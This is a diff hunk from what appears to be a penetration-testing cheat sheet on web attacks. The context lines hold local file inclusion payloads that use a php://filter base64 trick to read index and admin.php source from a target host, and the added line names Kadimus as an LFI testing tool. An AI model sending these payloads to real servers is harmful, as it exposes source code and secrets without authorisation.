@@ -1759,6 +1759,8 @@ Client, Web and Password Attacks
         "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
         | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
         ```
+    
+    -   There is a tool called Kadimus to test LFI too
 
     -   LFI - Download file with base 64 encoding  
         [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)
